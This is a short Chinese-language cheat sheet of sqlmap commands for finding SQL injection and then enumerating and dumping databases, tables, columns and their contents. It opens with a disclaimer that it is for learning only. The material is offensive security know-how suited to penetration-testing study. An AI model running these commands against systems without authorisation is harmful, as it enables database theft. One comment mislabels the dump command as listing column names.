# sqlmap 小记

---

## 免责声明

`本人撰写的手册,仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。`

---

## Reference
暂无

---

## 常见操作

```bash
sqlmap -u URL   # 判断注入
sqlmap -u URL --current-db  # 获取当前数据库
sqlmap -u URL -D DATABASE --tables  # 获取数据库表
sqlmap -u URL -D DATABASE -T TABLES --columns   # 获取指定表的列名
sqlmap -u URL -D DATABASE -T TABLES -C COLUMNS --dump   # 获取指定表的列名

sqlmap -u URL -p id # 指定参数注入
sqlmap -u URL --cookie="xxxxx"  # 带 cookie 注入
sqlmap -u URL --batch   # 不要请求用户输入，使用默认行为
sqlmap -r aaa.txt   # post型注入
```
